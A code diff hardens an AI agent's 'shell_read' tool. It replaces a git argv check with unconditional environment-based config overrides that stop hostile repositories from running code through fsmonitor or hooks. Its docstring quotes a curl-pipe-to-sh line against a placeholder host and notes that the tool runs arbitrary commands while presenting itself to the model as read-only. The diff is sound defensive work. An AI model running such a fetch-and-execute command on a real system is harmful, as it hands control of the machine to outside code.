@@ -21,20 +21,18 @@ like, because the allowlist was the ONLY barrier in front of the shell. Nothing
 gates this tool — ``ToolPermissionPolicy.decide`` returns ALLOW for every risk
 class and every source — and ``run`` hands the command to
 ``subprocess.run(..., shell=True)`` with no metacharacter handling, so
-``shell_read {"command": "curl -s http://x/p.sh | sh"}`` executes. Of the
-guarantees listed above, only the scrubbed environment and the runtime/output
-bounds survive intact: approved-root containment binds ``cwd``, never argv, and
-the git hardening stops being exhaustive (the ``argv[0] == "git"`` test in
-``run``). The tool still reports ``risk="shell_read"`` and describes itself to
-the model as read-only.
-docs/reviews/2026-07-21-restart-orphan-shell-review.md §2-§5.
+``shell_read {"command": "curl -s http://x/p.sh | sh"}`` executes. Approved-root
+containment binds ``cwd``, never argv. What DOES hold in either mode: the
+scrubbed environment, the runtime/output bounds, and the git hardening — that
+last one only since 2026-07-21, when it moved from an ``argv[0] == "git"`` test
+to unconditional environment variables (see ``_GIT_ENV_HARDENING``).
+docs/reviews/2026-07-21-restart-orphan-shell-review.md §2, §3.
 """
 
 from __future__ import annotations
 
 import copy
 import os
-import shlex
 import subprocess
 from collections.abc import Iterable, Mapping
 from typing import Any
@@ -76,18 +74,35 @@ _SCRUBBED_ENV = {
 # helper command. System and global config are silenced too, so the result of a
 # read-only command cannot depend on machine state outside this process.
 # These are security barriers, not cosmetics — do not drop them.
+#
+# Delivered through the environment, NOT by rewriting the command, and applied
+# to every invocation rather than to commands whose first word happens to be
+# `git`. That older argv test was exhaustive only while the allowlist held
+# commands to a fixed set of literals; with the allowlist off,
+# `/usr/bin/git …`, `cd sub && git …`, `env git …` and `sh -c 'git …'` all
+# walked past it into a hostile repository. GIT_CONFIG_KEY_n/VALUE_n reaches
+# git however it is spelled, including git run from a script the command
+# invokes. Verified 2026-07-21 against a repo whose core.fsmonitor writes a
+# sentinel: it fires unhardened and stays silent for all five spellings with
+# this env. Needs git >= 2.31 (this machine: 2.50.1).
+_GIT_CONFIG_OVERRIDES = (
+    ("core.fsmonitor", ""),
+    ("core.hooksPath", "/dev/null"),
+    ("protocol.ext.allow", "never"),
+)
 _GIT_ENV_HARDENING = {
     "GIT_CONFIG_NOSYSTEM": "1",
     "GIT_CONFIG_GLOBAL": "/dev/null",
+    "GIT_CONFIG_COUNT": str(len(_GIT_CONFIG_OVERRIDES)),
+    **{
+        key: value
+        for index, (name, setting) in enumerate(_GIT_CONFIG_OVERRIDES)
+        for key, value in (
+            (f"GIT_CONFIG_KEY_{index}", name),
+            (f"GIT_CONFIG_VALUE_{index}", setting),
+        )
+    },
 }
-_GIT_ARGV_HARDENING = (
-    "-c",
-    "core.fsmonitor=",
-    "-c",
-    "core.hooksPath=/dev/null",
-    "-c",
-    "protocol.ext.allow=never",
-)
 
 
 class ShellReadTool(Tool):
@@ -167,24 +182,11 @@ class ShellReadTool(Tool):
             )
 
         cwd = self._resolve_cwd(arguments)
-        env = dict(_SCRUBBED_ENV)
-        # Reassembled through shlex.quote: the string goes back to a shell, so
-        # an allowlist entry carrying a space or a quote must not be re-parsed
-        # into extra words.
-        # KNOWN DEFECT: this argv[0] test was exhaustive only while the
-        # allowlist held commands to a fixed set of literals. With
-        # unrestricted=True, `/usr/bin/git status`, `cd sub && git status`,
-        # `env git status` and `sh -c 'git status'` all reach git without the
-        # hardening below — which is exactly the arbitrary code execution the
-        # comment above _GIT_ENV_HARDENING describes. The new test only covers
-        # the literal `git status --short`, so it passes over the hole.
-        # Review §3.
-        argv_check = shlex.split(normalized)
-        if argv_check and argv_check[0] == "git":
-            hardening = " ".join(_GIT_ARGV_HARDENING)
-            rest = " ".join(shlex.quote(part) for part in argv_check[1:])
-            normalized = f"git {hardening} {rest}"
-            env.update(_GIT_ENV_HARDENING)
+        # Git hardening is unconditional: no inspection of the command, so
+        # there is no spelling of `git` that can slip past it, and nothing to
+        # keep in sync when a new one is invented. The variables are inert for
+        # commands that never run git.
+        env = {**_SCRUBBED_ENV, **_GIT_ENV_HARDENING}
 
         try:
             completed = subprocess.run(
